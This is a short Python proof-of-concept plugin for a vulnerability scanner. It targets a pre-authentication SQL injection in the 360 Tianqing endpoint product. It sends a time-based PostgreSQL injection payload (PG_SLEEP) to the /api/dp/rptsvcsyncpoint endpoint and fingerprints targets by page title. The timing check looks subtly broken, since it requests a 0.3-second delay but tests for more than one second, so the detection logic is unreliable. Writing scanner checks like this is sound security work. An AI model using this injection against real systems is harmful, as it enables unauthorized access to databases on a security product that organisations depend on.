# -*- coding:utf-8 -*-
# 360天擎 前台SQL注入

from .. import requestUtil, fileUtil
from ServiceScanModel.models import ServiceScan


def sql_test(url):
    resp = requestUtil.get(url + "/api/dp/rptsvcsyncpoint?ccid=1%27;SELECT%20PG_SLEEP(0.3)--")
    if resp.elapsed.total_seconds() > 1:
        return True


def fingerprint(service):
    try:
        if "360新天擎" in service.title:
            return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        if sql_test(service.url):
            return ["360天擎 前台SQL注入", "vuln path: <br>%s" % "/api/dp/rptsvcsyncpoint?ccid=1"]
    except:
        return []
